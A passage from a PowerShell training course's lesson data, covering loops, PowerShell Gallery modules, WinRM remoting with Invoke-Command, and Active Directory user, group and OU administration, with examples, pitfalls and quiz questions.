        body: 'If `$arr` has 4 items, `$arr.Count` is `4`, and the valid indices are `0, 1, 2, 3`. If you write `$i -le $arr.Count`, the loop runs a 5th time at `$arr[4]` (which is `$null`!). Always write `$i -lt $arr.Count`.',
      },
      {
        type: 'pro',
        title: 'foreach Statement vs. ForEach-Object in the Pipeline',
        body: '`foreach ($x in $list) { ... }` at the start of a line loads the list into memory first and loops at blazing speed. `... | ForEach-Object { $_ }` in the middle of a pipeline streams objects one at a time.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Test-Connection',
        aliases: ['ping'],
        syntax: 'Test-Connection [-TargetName] <String[]> [-Count <Int32>] [-Quiet]',
        parameters: [
          {
            name: '-Count',
            type: 'Int32',
            description: 'Specifies how many ICMP echo requests (pings) to send.',
          },
          {
            name: '-Quiet',
            type: 'SwitchParameter',
            description: 'Suppresses detailed ping objects and returns a simple Boolean ($true or $false) ready for if (...) checks.',
          },
        ],
        examples: ['if (Test-Connection 127.0.0.1 -Count 1 -Quiet) { "Online!" }'],
      },
    ],
    codeExamples: [
      {
        title: 'If/Else Selection, Foreach Object Loops, and In-Place Array Replacement with For',
        description: 'Demonstrate conditional branching, iterating over process objects with $(), and replacing an array element by index.',
        code: `# 1. Selection (if / else) using Test-Path
if (Test-Path -Path 'C:\\Windows\\System32\\ntoskrnl.exe') {
  Write-Output "[OK] Windows NT Kernel image verified on disk."
} else {
  Write-Output "[ALERT] Kernel file not found!"
}

# 2. Foreach loop over live Process objects (using $($proc.Property) inside double quotes)
$topProcs = Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 3
foreach ($proc in $topProcs) {
  Write-Output "$($proc.Name) is running with PID $($proc.Id)"
}

# 3. For loop with index $i to find and replace an element inside an array
$fruits = @('apple', 'pear', 'banana', 'orange')
for ($i = 0; $i -lt $fruits.Count; $i++) {
  if ($fruits[$i] -eq 'banana') {
    $fruits[$i] = 'mango'
  }
}
Write-Output "Updated array: $($fruits -join ', ')"`,
        output: `[OK] Windows NT Kernel image verified on disk.
MsMpEng is running with PID 3412
explorer is running with PID 5412
pwsh is running with PID 8820
Updated array: apple, pear, mango, orange`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Writing an infinite `while` loop by forgetting to increment the counter (`$i++`) inside the `{ ... }` body.',
        cause: 'If the loop variable never changes, the `while` condition stays `$true` forever (press `Ctrl+C` to break out!).',
        fix: 'Always update your counter or state variable inside a `while` loop, or use `foreach` / `for` when the iteration count is known.',
      },
    ],
    tryItYourself: [
      'Write a `foreach ($svc in (Get-Service | Select-Object -First 5))` loop that prints `"Service $($svc.Name) has status $($svc.Status)"`.',
      'Write an `if / else` check using `Test-Path C:\\Windows` that prints whether the folder exists.',
    ],
    knowledgeCheck: [
      {
        question: 'Why should a `for` loop over an array `$items` use `$i -lt $items.Count` instead of `$i -le $items.Count`?',
        options: [
          'Because PowerShell does not have a -le operator',
          'Because arrays are zero-indexed, so the last valid index is ($items.Count - 1); using -le reads one index past the end of the array',
          'Because -lt runs in Kernel Mode',
          'Because $items.Count starts at 10',
        ],
        correctIndex: 1,
        explanation: 'A 4-element array has indices 0, 1, 2, and 3 while .Count is 4. Using $i -lt $items.Count stops cleanly at index 3.',
      },
      {
        question: 'Which switch on Test-Connection returns a simple $true or $false boolean value ideal for an `if (...)` statement?',
        options: ['-Boolean', '-Quiet', '-Fast', '-Simple'],
        correctIndex: 1,
        explanation: 'Test-Connection -Quiet returns $true if any ping succeeds and $false if all pings fail.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 11: MODULES, POWERSHELL GALLERY & WINRM REMOTING
  // ==========================================================================
  {
    id: '11-1',
    chapterId: 'chapter-11',
    slug: 'module-lifecycle',
    title: 'Modules & The PowerShell Gallery: Installed vs Imported',
    subtitle: 'Walk through the 5-step module workflow so you never get stuck when auto-import fails',
    estimatedMinutes: 25,
    oneSentenceSummary:
      'A Module is a plug-in toolbox of cmdlets; follow the 5-step lifecycle (`Find-Module` → `Install-Module` → `Get-Module -ListAvailable` → `Import-Module` → `Get-Command -Module`) to add any capability from Active Directory to VMware PowerCLI.',
    summary:
      'Out of the box, PowerShell ships with core modules for Windows processes, services, and networking. But what when you need to manage Active Directory, VMware vSphere (`VMware.PowerCLI`), Microsoft 365, AWS, or Azure? You install a **Module**! In this lesson, we master the crucial difference between a module being **Installed on disk** versus **Imported into RAM**, and walk through the 5-Step Module Lifecycle.',
    whyItMatters:
      'When an engineer installs a module or RSAT feature and a script still fails to recognize its cmdlets, knowing `Get-Module -ListAvailable` and `Import-Module` solves the issue in 5 seconds.',
    learningObjectives: [
      'Explain the difference between a module that is **Installed on disk** (`Get-Module -ListAvailable`) vs. **Imported into the current session’s RAM** (`Get-Module`)',
      'Execute the 5-Step Module Lifecycle: `Find-Module` → `Install-Module` → `Get-Module -ListAvailable` → `Import-Module` → `Get-Command -Module`',
      'Inspect `$env:PSModulePath` to see where PowerShell looks for installed modules on disk',
      'Remove or update modules cleanly using `Update-Module` and `Uninstall-Module`',
    ],
    keyTerms: [
      'PowerShell Module (.psm1 / .psd1)',
      'PowerShell Gallery (PSGallery)',
      'Installed (On Disk) vs. Imported (In RAM)',
      'Find-Module & Install-Module',
      'Get-Module -ListAvailable & Import-Module',
      'Get-Command -Module <ModuleName>',
    ],
    conceptSections: [
      {
        heading: 'Installed on Disk vs. Imported in Memory: The Bookshelf Analogy',
        body: [
          'Think of a **Module** as a reference manual:\n• **Installed on Disk (`Get-Module -ListAvailable`):** The book is sitting on your bookshelf (`$env:PSModulePath`). It is saved on your SSD, even if you haven’t opened it yet in today’s terminal window.\n• **Imported in RAM (`Get-Module` without switches):** You have pulled the book off the shelf and opened it on your desk for the current PowerShell session.',
          'Since PowerShell 3.0, PowerShell tries to **auto-import** a module the first time you type one of its cmdlets. However, in automation scripts, startup profiles, or complex modules like `VMware.PowerCLI`, you should explicitly load the module with **`Import-Module`** at the top of your script!',
        ],
      },
      {
        heading: 'My 5-Step Module Lifecycle (Memorize This Sequence!)',
        body: [
          'Whenever you need to add a new capability (like `PSReadLine`, `Posh-SSH`, or `VMware.PowerCLI`) from the official **PowerShell Gallery**, walk through these exact 5 steps:\n1. **Search the online gallery:** `Find-Module -Name *VMware*`\n2. **Download and install to disk:** `Install-Module -Name VMware.PowerCLI -Scope CurrentUser`\n3. **Verify it is installed on disk:** `Get-Module -ListAvailable -Name VMware*`\n4. **Load it into your current session’s RAM:** `Import-Module -Name VMware.PowerCLI`\n5. **List all cmdlets inside that module:** `Get-Command -Module VMware.PowerCLI`',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: '`Get-Module` shows modules currently loaded in RAM; `Get-Module -ListAvailable` shows every module installed on your hard drive across `$env:PSModulePath`.',
      },
      {
        type: 'try',
        title: 'Compare Loaded vs. Available Modules Right Now',
        body: 'Run `(Get-Module).Count` (modules loaded in RAM right now) and then `(Get-Module -ListAvailable).Count` (all modules installed on your disk). Notice the huge difference!',
      },
      {
        type: 'pro',
        title: 'Installing Without Admin Rights Using -Scope CurrentUser',
        body: 'By default, `Install-Module` tries to write to `C:\\Program Files` (which requires Administrator rights). Pass `-Scope CurrentUser` to install cleanly into your personal user profile folder!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Get-Module',
        aliases: ['gmo'],
        syntax: 'Get-Module [[-Name] <String[]>] [-ListAvailable]',
        parameters: [
          {
            name: '-ListAvailable',
            type: 'SwitchParameter',
            description: 'Lists all modules installed on disk inside $env:PSModulePath, not just those currently imported into RAM.',
          },
        ],
        examples: [
          'Get-Module',
          'Get-Module -ListAvailable',
          'Get-Command -Module NetTCPIP',
        ],
      },
      {
        cmdlet: 'Install-Module',
        aliases: [],
        syntax: 'Install-Module [-Name] <String[]> [-Scope <String>] [-Force]',
        parameters: [
          {
            name: '-Scope',
            type: 'String',
            description: 'Specifies AllUsers (requires Admin) or CurrentUser (no Admin required).',
          },
        ],
        examples: ['Install-Module -Name Posh-Git -Scope CurrentUser'],
      },
    ],
    codeExamples: [
      {
        title: 'The 5-Step Module Lifecycle in Action',
        description: 'Inspect module paths, compare loaded vs installed modules, and list all cmdlets inside a specific module.',
        code: `# 1. Inspect the folders where PowerShell searches for modules on disk
$env:PSModulePath -split ';'

# 2. List modules currently imported into RAM vs installed on disk
Get-Module | Select-Object Name, Version
Get-Module -ListAvailable -Name 'Microsoft.PowerShell.*' | Select-Object Name, Version

# 3. Explicitly import a module and list all cmdlets it provides
Import-Module -Name Microsoft.PowerShell.LocalAccounts
Get-Command -Module Microsoft.PowerShell.LocalAccounts`,
        output: `C:\\Users\\izaz\\Documents\\PowerShell\\Modules
C:\\Program Files\\PowerShell\\Modules
C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules

CommandType Name              Version Source
----------- ----              ------- ------
Cmdlet      Add-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      Disable-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      Enable-LocalUser  1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      Get-LocalGroup    1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      Get-LocalUser     1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      New-LocalUser     1.0.0.0 Microsoft.PowerShell.LocalAccounts
Cmdlet      Remove-LocalUser  1.0.0.0 Microsoft.PowerShell.LocalAccounts`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Running `Get-Module` without `-ListAvailable` and assuming a module is not installed on the server because it didn’t appear in the list.',
        cause: '`Get-Module` with no parameters only shows modules already imported into the current session’s RAM.',
        fix: 'Always use `Get-Module -ListAvailable` when checking if a module is installed on disk.',
      },
    ],
    tryItYourself: [
      'Run `Get-Command -Module NetTCPIP` to see every network cmdlet packaged inside the built-in `NetTCPIP` module.',
      'Run `Get-Module -ListAvailable` to explore every module pre-installed on your Windows system.',
    ],
    knowledgeCheck: [
      {
        question: 'What is the difference between `Get-Module` and `Get-Module -ListAvailable`?',
        options: [
          'They return the exact same output',
          'Get-Module shows only modules currently imported in RAM; Get-Module -ListAvailable scans the disk ($env:PSModulePath) for all installed modules',
          'Get-Module -ListAvailable downloads modules from the internet',
          'Get-Module deletes unused modules',
        ],
        correctIndex: 1,
        explanation: 'Get-Module lists modules active in the current session, whereas Get-Module -ListAvailable inspects all module directories on disk.',
      },
      {
        question: 'Once you know a module’s name (for example, NetSecurity), which command lists every cmdlet inside that module?',
        options: [
          'Get-Module -Cmdlets NetSecurity',
          'Get-Command -Module NetSecurity',
          'Select-String -Module NetSecurity',
          'Show-Module NetSecurity',
        ],
        correctIndex: 1,
        explanation: 'Get-Command -Module <ModuleName> lists all cmdlets, functions, and aliases exported by that module.',
      },
    ],
  },

  {
    id: '11-2',
    chapterId: 'chapter-11',
    slug: 'winrm-and-remoting',
    title: 'PowerShell Remoting: WinRM (5985/5986), Enter-PSSession & Invoke-Command',
    subtitle: 'Control headless servers remotely, run parallel scriptblocks, and understand Kerberos Double-Hop',
    estimatedMinutes: 25,
    oneSentenceSummary:
      'PowerShell Remoting uses WinRM over TCP ports `5985` (HTTP) and `5986` (HTTPS) to give you 1-to-1 interactive shells (`Enter-PSSession`) and 1-to-many parallel execution across hundreds of servers (`Invoke-Command`).',
    summary:
      'Why walk over to a server or open a heavy Remote Desktop (RDP) session that eats 300 MB of RAM on the server when you can manage 100 servers simultaneously from your workstation terminal? In this lesson, we explore **WinRM (Windows Remote Management)**, memorize its network ports (`5985` and `5986`), test connectivity with `Test-WSMan`, compare `Enter-PSSession` (1-to-1) with `Invoke-Command` (1-to-many), and unpack the famous **Kerberos Double-Hop problem**.',
    whyItMatters:
      'Remember our headless Windows Server Core VM from Chapter 9? Once its static IP is configured, you almost never sit at its physical console again, you manage it remotely from your workstation via WinRM!',
    learningObjectives: [
      'Explain how WinRM (WS-Management protocol) works and memorize its default ports: **TCP 5985 (HTTP)** and **TCP 5986 (HTTPS)**',
      'Enable and verify PowerShell Remoting using `Enable-PSRemoting -Force` and `Test-WSMan`',
      'Choose between `Enter-PSSession` (interactive 1-to-1 terminal, like SSH) and `Invoke-Command` (parallel 1-to-many scriptblock execution)',
      'Explain the **Kerberos Double-Hop Problem** and why credentials cannot jump from Server A to Server B to Server C without delegation or CredSSP',
    ],
    keyTerms: [
      'WinRM (Windows Remote Management) & WS-Man',
      'TCP Port 5985 (HTTP) & TCP Port 5986 (HTTPS)',
      'Test-WSMan & Enable-PSRemoting',
      'Enter-PSSession (1-to-1) & Exit-PSSession',
      'Invoke-Command (1-to-Many) -ScriptBlock',
      'Kerberos Double-Hop Problem',
    ],
    conceptSections: [
      {
        heading: 'How WinRM Works & The Two Ports Every Engineer Must Memorize',
        body: [
          'On Windows Server (2012 R2 through 2025), **PowerShell Remoting is enabled by default** via the **WinRM (`Windows Remote Management`)** service. On Windows 10/11 client machines, it is disabled by default until an Administrator runs **`Enable-PSRemoting -Force`**.',
          'Memorize the two default WinRM TCP ports:\n• **TCP Port `5985`:** WinRM over **HTTP** *(Note: Even over HTTP port 5985, all PowerShell Remoting traffic in an Active Directory domain is encrypted using Kerberos/NTLM session keys!)*\n• **TCP Port `5986`:** WinRM over **HTTPS** (TLS certificate encryption).',
          'Before trying to connect to a remote server, verify that its WinRM service is listening by running:\n**`Test-WSMan -ComputerName SRV-CORE01`**',
        ],
      },
      {
        heading: '1-to-1 Interactive (`Enter-PSSession`) vs. 1-to-Many Fan-Out (`Invoke-Command`)',
        body: [
          'PowerShell Remoting gives you two distinct ways to work:\n1. **1-to-1 Interactive Session (`Enter-PSSession` - Like SSH):**\n   `Enter-PSSession -ComputerName SRV-CORE01`\n   Your prompt immediately changes to **`[SRV-CORE01]: PS C:\\Users\\izaz\\Documents>`**. Every command you type now runs directly on `SRV-CORE01`! When you are finished, type **`Exit-PSSession`**.\n2. **1-to-Many Parallel Fan-Out (`Invoke-Command` - The Enterprise Superpower):**\n   What if you need to check a service or install a patch on **50 servers at the exact same time**? Pass an array of server names to **`Invoke-Command`** along with a **`-ScriptBlock { ... }`** (or a local script file via `-FilePath`):\n   `Invoke-Command -ComputerName SRV-CORE01, SRV-DC01, SRV-SQL01 -ScriptBlock { Get-Service -Name WinRM }`\n   PowerShell runs the command across all servers in parallel, serializes the resulting objects over XML, and automatically adds a **`PSComputerName`** property to every row so you know which server returned which result!',
        ],
      },
      {
        heading: 'The Kerberos Double-Hop Problem Explained Simply',
        body: [
          'Here is a classic real-world scenario that stumps even experienced admins:\n1. You are sitting at your **Admin Workstation (Machine 1)**.\n2. You `Enter-PSSession` or `Invoke-Command` into **`SRV-CORE01` (Machine 2 - Hop #1)**. Authentication succeeds via Kerberos!\n3. Inside that remote session on `SRV-CORE01`, you try to copy a file from a third server: `Copy-Item \\\\SRV-FILES01\\Share\\installer.msi C:\\Temp` (**Machine 3 - Hop #2**).\n4. **ACCESS DENIED!** Why? Because to protect you against a compromised server stealing your credentials and impersonating you across the rest of the network, Kerberos refuses to let `SRV-CORE01` forward your token to `SRV-FILES01`! That is called the **Kerberos Double-Hop Problem**.\n• **How pros solve it safely:** Either copy files from your workstation directly using a `New-PSSession` (`Copy-Item -ToSession $session`), pass explicit credentials inside the block, or configure **Resource-Based Kerberos Constrained Delegation**.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'WinRM listens on TCP `5985` (HTTP) and `5986` (HTTPS); use `Enter-PSSession` to troubleshoot one server interactively and `Invoke-Command` to execute code across many servers in parallel.',
      },
      {
        type: 'gotcha',
        title: 'Workgroup vs. Active Directory Domain Remoting',
        body: 'Inside an Active Directory domain, Kerberos handles WinRM authentication seamlessly when you use the server’s **hostname** (`SRV-CORE01`). If you connect by raw IP address (`192.168.153.210`) or in a Workgroup without a domain, Kerberos cannot verify the target and requires adding the IP to `TrustedHosts` or using HTTPS!',
      },
      {
        type: 'pro',
        title: 'Persistent Sessions with New-PSSession',
        body: 'If you run `Invoke-Command -ComputerName SRV01` five times in a row, PowerShell creates and tears down a brand-new session 5 times (losing any variables you created). Instead, create a persistent session with `$s = New-PSSession -ComputerName SRV01` and pass `Invoke-Command -Session $s`!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Invoke-Command',
        aliases: ['icm'],
        syntax: 'Invoke-Command [-ComputerName <String[]>] [-ScriptBlock] <ScriptBlock> [-Credential <PSCredential>]',
        parameters: [
          {
            name: '-ComputerName',
            type: 'String[]',
            description: 'One or more remote server hostnames to execute the command on in parallel.',
          },
          {
            name: '-ScriptBlock',
            type: 'ScriptBlock',
            description: 'The { ... } block of PowerShell commands to run on the remote computers.',
          },
          {
            name: '-FilePath',
            type: 'String',
            description: 'Runs a local .ps1 script file on the remote computers without needing to copy the file over first!',
          },
        ],
        examples: [
          'Invoke-Command -ComputerName SRV-CORE01, SRV-DC01 -ScriptBlock { Get-Process }',
          'Invoke-Command -ComputerName SRV-CORE01 -FilePath .\\healthcheck.ps1',
        ],
      },
      {
        cmdlet: 'Enter-PSSession',
        aliases: ['etsn'],
        syntax: 'Enter-PSSession [-ComputerName] <String> [-Credential <PSCredential>]',
        parameters: [
          {
            name: '-ComputerName',
            type: 'String',
            description: 'Opens a 1-to-1 interactive PowerShell prompt on the specified remote computer.',
          },
        ],
        examples: ['Enter-PSSession -ComputerName SRV-CORE01'],
      },
    ],
    codeExamples: [
      {
        title: 'Testing WinRM, Interactive Sessions, and Parallel Multi-Server Invoke-Command',
        description: 'Verify WinRM over port 5985, enter an interactive session, and query multiple servers simultaneously.',
        code: `# 1. Verify that the remote server's WinRM service is responding (TCP 5985)
Test-WSMan -ComputerName 'SRV-CORE01'

# 2. Interactive 1-to-1 remote troubleshooting session
Enter-PSSession -ComputerName 'SRV-CORE01'
# [SRV-CORE01]: PS C:\\> hostname
Exit-PSSession

# 3. Parallel 1-to-Many execution across multiple servers at once
$servers = @('SRV-CORE01', 'SRV-DC01', 'SRV-SQL01')
Invoke-Command -ComputerName $servers -ScriptBlock {
  [PSCustomObject]@{
    OSBuild   = [System.Environment]::OSVersion.Version.Build
    WinRMStat = (Get-Service -Name WinRM).Status
    FreeGB    = [math]::Round((Get-PSDrive C).Free / 1GB, 1)
  }
} | Select-Object PSComputerName, OSBuild, WinRMStat, FreeGB`,
        output: `wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 10.0.26100 SP: 0.0 Stack: 3.0

PSComputerName OSBuild WinRMStat FreeGB
-------------- ------- --------- ------
SRV-CORE01       26100   Running   48.4
SRV-DC01         26100   Running   41.2
SRV-SQL01        26100   Running  215.8`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Trying to pass a local variable `$myVar` inside `Invoke-Command -ScriptBlock { Write-Output $myVar }` and wondering why it prints `$null`.',
        cause: 'Code inside `-ScriptBlock { ... }` executes on the **remote server**, which does not have your local workstation’s variables in its RAM!',
        fix: 'Prefix local variables with the `$using:` scope modifier inside remote scriptblocks: `Invoke-Command -ComputerName SRV01 -ScriptBlock { Write-Output $using:myVar }`.',
      },
    ],
    tryItYourself: [
      'Run `Get-Service -Name WinRM` on your machine to check whether the Windows Remote Management service is currently `Running` or `Stopped`.',
      'Run `Invoke-Command -ScriptBlock { Get-Date }` locally (without `-ComputerName`) to see how `-ScriptBlock` executes an isolated block of code.',
    ],
    knowledgeCheck: [
      {
        question: 'Which two TCP ports does WinRM (PowerShell Remoting) use by default for HTTP and HTTPS?',
        options: [
          'TCP 80 (HTTP) and TCP 443 (HTTPS)',
          'TCP 5985 (HTTP) and TCP 5986 (HTTPS)',
          'TCP 22 (SSH) and TCP 3389 (RDP)',
          'TCP 445 (SMB) and TCP 53 (DNS)',
        ],
        correctIndex: 1,
        explanation: 'WinRM listens on TCP 5985 for HTTP and TCP 5986 for HTTPS.',
      },
      {
        question: 'When should you use `Invoke-Command` instead of `Enter-PSSession`?',
        options: [
          'When you want to run a scriptblock across 10, 50, or 500 remote servers in parallel and collect structured results',
          'Only when you do not know the server name',
          'Only on Linux machines',
          'Never; Enter-PSSession is for multiple servers',
        ],
        correctIndex: 0,
        explanation: 'Enter-PSSession is for 1-to-1 interactive typing; Invoke-Command scales to 1-to-many parallel execution across arrays of servers.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 12: ACTIVE DIRECTORY, DOMAIN CONTROLLERS, DNS & PASSWORD POLICIES
  // ==========================================================================
  {
    id: '12-1',
    chapterId: 'chapter-12',
    slug: 'ad-users-groups-and-ous',
    title: 'Active Directory Users, Groups, OUs & Trust Channel Repair',
    subtitle: 'Manage directory identities at scale, import users from CSV, and fix broken domain trust in one line',
    estimatedMinutes: 35,
    oneSentenceSummary:
      'The `ActiveDirectory` module lets you create, query, and organize thousands of domain users (`*-ADUser`), groups (`*-ADGroup`), and Organizational Units (`*-ADOrganizationalUnit`), and repair broken workstation domain trusts in one line (`Test-ComputerSecureChannel -Repair`).',
    summary:
      'Active Directory (AD) is the central identity vault of almost every enterprise network on earth. Instead of clicking through "Active Directory Users and Computers" (`dsa.msc`) for hours, we use the `ActiveDirectory` PowerShell module to provision users from CSV files, manage group memberships, protect OUs from accidental deletion, and fix the dreaded *"The trust relationship between this workstation and the primary domain failed"* error without unjoining and rejoining the domain!',
    whyItMatters:
      'Automating user onboarding/offboarding and fixing domain trust issues in seconds are staple expectations for every Windows Systems and Security Engineer.',
    learningObjectives: [
      'Create, query (`-Filter` & `-Properties`), modify, and delete domain users using `New-ADUser`, `Get-ADUser`, `Set-ADUser`, and `Remove-ADUser`',
      'Explain why `Get-ADUser` only returns a small default set of properties unless you request extra attributes with `-Properties`',
      'Create and populate Security Groups (`New-ADGroup`, `Add-ADGroupMember`, `Get-ADGroupMember`) and Organizational Units (`New-ADOrganizationalUnit`)',
      'Join computers to a domain (`Add-Computer`) and repair a broken domain trust password online with `Test-ComputerSecureChannel -Repair`',
    ],
    keyTerms: [
      'ActiveDirectory Module (RSAT)',
      'Get-ADUser -Filter & -Properties',
      'New-ADUser & Set-ADAccountPassword',
      'ADGroup (DomainLocal, Global, Universal)',
      'Organizational Unit (OU) & DistinguishedName (DN)',
      'Test-ComputerSecureChannel -Repair',
    ],
    conceptSections: [
      {
        heading: 'Querying and Provisioning Domain Users (Why Get-ADUser Needs -Properties)',
        body: [
          'Every Active Directory user object in the database actually has **over 100 attributes** (`Department`, `Title`, `Mail`, `LastLogonDate`, `PasswordLastSet`, `LockedOut`). To keep network traffic fast on huge domains, **`Get-ADUser` only fetches 10 basic properties by default** (`DistinguishedName`, `Enabled`, `GivenName`, `Name`, `ObjectClass`, `ObjectGUID`, `SamAccountName`, `SID`, `Surname`, `UserPrincipalName`).',
          'If you need `Department` or `PasswordLastSet`, always ask for it explicitly with **`-Properties`**:\n`Get-ADUser -Filter "Department -eq \'Engineering\'" -Properties Department, Title, PasswordLastSet`',
          'And notice **`-Filter` is mandatory** on `Get-ADUser` when you aren’t querying a single `-Identity`! That enforces the **Filter Left** law so the Domain Controller filters the records before sending them over the wire.',
        ],
      },
      {
        heading: 'Organizational Units (OUs), Security Groups & Bulk CSV Onboarding',
        body: [
          'In Active Directory, we organize users and computers into **Organizational Units (OUs)** so we can link Group Policies (GPOs) and delegate permissions cleanly:\n• Create an OU: `New-ADOrganizationalUnit -Name "Servers" -Path "DC=corp,DC=local" -ProtectedFromAccidentalDeletion $true`\n• Create a Security Group: `New-ADGroup -Name "GRP_SecOps" -GroupScope Global -GroupCategory Security -Path "OU=Groups,DC=corp,DC=local"`\n• Add users to a group: `Add-ADGroupMember -Identity "GRP_SecOps" -Members "izaz", "sarah"`\n• Audit group members: `Get-ADGroupMember -Identity "Domain Admins"`',
        ],
      },
      {
        heading: 'Lifesaver Command: Fixing Broken Domain Trust Without Rebooting Twice!',
        body: [
          'Have you ever restored a VM snapshot or powered on a laptop that was offline for 60 days and got locked out at login with:\n*"The trust relationship between this workstation and the primary domain failed"*?',
          'Why does that happen? Because every domain-joined computer has its own hidden machine account password that rotates automatically every 30 days. When a VM is reverted to an old snapshot, its local password no longer matches the Domain Controller’s copy!',
          'Old-school admins waste 20 minutes unjoining the computer to a Workgroup, rebooting, rejoining the domain, and rebooting again. **With PowerShell, you fix it in 3 seconds with zero reboots:**\n`Test-ComputerSecureChannel -Repair -Credential (Get-Credential)`',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Always pass `-Filter` and `-Properties` to `Get-ADUser` so the Domain Controller does the heavy lifting, and use `Test-ComputerSecureChannel -Repair` to fix broken machine trust relationships instantly.',
      },
      {
        type: 'gotcha',
        title: 'Why New-ADUser Creates a Disabled Account If You Omit -AccountPassword',
        body: 'Domain password policy forbids active blank passwords. If you run `New-ADUser -Name "bob"` without passing `-AccountPassword <SecureString> -Enabled $true`, Active Directory creates the account in a **Disabled** state!',
      },
      {
        type: 'pro',
        title: 'DistinguishedName (DN) Reading Order: Leaf to Root',
        body: 'An Active Directory `DistinguishedName` reads from most specific to broadest, just like a street address: `CN=Izaz Haider,OU=Security,OU=Staff,DC=corp,DC=local`.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Get-ADUser',
        aliases: [],
        syntax: 'Get-ADUser -Filter <String> [-SearchBase <String>] [-Properties <String[]>]',
        parameters: [
          {
            name: '-Filter',
            type: 'String',
            description: 'Server-side query string evaluated directly by the Domain Controller (e.g., "Department -eq \'IT\'").',
          },
          {
            name: '-Properties',
            type: 'String[]',
            description: 'Requests additional AD attributes beyond the 10 default properties (pass * to inspect all attributes on a single user).',
          },
        ],
        examples: [
          'Get-ADUser -Identity izaz -Properties *',
          'Get-ADUser -Filter "Enabled -eq $true -and Department -eq \'Security\'" -Properties Department, LastLogonDate',
        ],
      },
      {
        cmdlet: 'Test-ComputerSecureChannel',
        aliases: [],
        syntax: 'Test-ComputerSecureChannel [-Repair] [-Credential <PSCredential>]',
        parameters: [
          {
            name: '-Repair',
            type: 'SwitchParameter',
            description: 'Resets and re-synchronizes the computer account password with the Domain Controller without requiring a reboot.',
          },
        ],
        examples: ['Test-ComputerSecureChannel -Repair -Credential CORP\\Administrator'],
      },
    ],
    codeExamples: [
      {
        title: 'Creating OUs, Provisioning AD Users, Managing Groups, and Repairing Trust',
        description: 'Complete Active Directory identity workflow using the ActiveDirectory module.',
        code: `# 1. Create a new Organizational Unit (protected from accidental deletion)
New-ADOrganizationalUnit -Name 'Engineering' -Path 'DC=corp,DC=local' -ProtectedFromAccidentalDeletion $true

# 2. Create an enabled Active Directory User with an encrypted SecureString password
$secPwd = Read-Host -Prompt 'Enter initial AD password' -AsSecureString
New-ADUser -Name 'Izaz Haider' \`
  -SamAccountName 'ihaider' \`
  -UserPrincipalName 'ihaider@corp.local' \`
  -Path 'OU=Engineering,DC=corp,DC=local' \`
  -Department 'Security Engineering' \`
  -AccountPassword $secPwd \`
  -Enabled $true

# 3. Create a Global Security Group and add the user to it
New-ADGroup -Name 'GRP_Eng_Admins' -GroupScope Global -GroupCategory Security -Path 'OU=Engineering,DC=corp,DC=local'
Add-ADGroupMember -Identity 'GRP_Eng_Admins' -Members 'ihaider'

# 4. Query users in the Engineering department and request extra attributes
Get-ADUser -Filter "Department -eq 'Security Engineering'" -Properties Department, Created |
  Select-Object Name, SamAccountName, Enabled, Department, Created

# 5. Verify (and repair if needed) the workstation's secure channel to the Domain Controller
Test-ComputerSecureChannel -Verbose`,
        output: `Name        SamAccountName Enabled Department           Created
----        -------------- ------- ----------           -------
Izaz Haider ihaider           True Security Engineering 11/3/2026 11:55:00 PM

VERBOSE: Performing the operation "Test-ComputerSecureChannel" on target "SRV-CORE01".
True`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Running `Get-ADUser -Filter * -Properties *` on a domain with 50,000 users.',
        cause: 'Asking for `*` (all users) AND `*` (all 120+ properties per user) forces the Domain Controller to serialize megabytes of LDAP data.',
        fix: 'Filter specifically with `-Filter` and request only the exact `-Properties` names your script needs (`-Properties Department, Mail, LastLogonDate`).',
      },
    ],
    tryItYourself: [
      'Write a `Get-ADUser` command that finds all locked-out accounts (`Search-ADAccount -LockedOut`) and unlocks them with `Unlock-ADAccount`.',
      'Compare the `DistinguishedName` of an OU (`OU=Engineering,DC=corp,DC=local`) with the `DistinguishedName` of a user inside that OU.',
    ],
    knowledgeCheck: [
      {
        question: 'Why does `(Get-ADUser -Identity ihaider).Department` return nothing unless you add `-Properties Department`?',
        options: [
          'Active Directory does not store department names',
          'For performance, Get-ADUser only retrieves 10 core properties by default; any extra attributes must be requested via -Properties',
          'Department is only available on Linux',
          'You must reboot the Domain Controller first',
        ],
        correctIndex: 1,
        explanation: 'Get-ADUser retrieves a lightweight default property set unless you specify additional attribute names with -Properties.',
      },
      {
        question: 'Which command fixes "The trust relationship between this workstation and the primary domain failed" without unjoining the domain or rebooting?',
        options: [
          'Restart-Computer -Force',
          'Test-ComputerSecureChannel -Repair -Credential (Get-Credential)',
          'Remove-ADComputer',
          'Clear-DnsClientCache',
        ],
        correctIndex: 1,
        explanation: 'Test-ComputerSecureChannel -Repair resets the secure channel machine password between the computer and the Domain Controller online.',
      },
    ],
  },

  {
    id: '12-2',
    chapterId: 'chapter-12',
    slug: 'ad-forests-dns-and-fgpp',
    title: 'Forests, Domain Controllers, DNS Server Management & Fine-Grained Passwords',
    subtitle: 'Deploy AD DS from PowerShell, query SRV/SOA DNS records, and apply strict password policies to admin groups',
    estimatedMinutes: 30,
    oneSentenceSummary:
